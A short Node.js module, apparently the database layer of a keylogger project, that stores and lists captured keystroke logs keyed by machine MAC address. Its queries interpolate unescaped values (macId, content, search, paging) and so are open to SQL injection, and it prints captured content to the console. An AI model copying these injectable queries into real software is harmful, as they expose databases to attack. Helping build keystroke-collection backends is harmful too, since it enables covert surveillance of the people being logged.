const { Connection } = require("../connection/connection");

const KeyloggerDao = {
    insert: (keylogger) => {
        let statement = `INSERT INTO log(mac_id, date_created, content)
            VALUES('${keylogger.macId}', ${Connection.escape(keylogger.dateCreated)}, '${keylogger.content}')`;

        console.log("statement: ", statement);

        Connection.query(statement, function (err) {
            if (err) throw err;
            console.log("Inserted");
          });
    },

    getAll: (param = {search: "", page: 1, size: 10}, callback) => {
        let query = `SELECT * 
            FROM log 
            where mac_id LIKE '%${param.search}%'
            LIMIT ${param.size} OFFSET ${(param.page - 1) * param.size}`;

        Connection.query(query, function (err, result) {
            if (err) throw err;
            callback(result);
        });
    }
};

module.exports = { KeyloggerDao };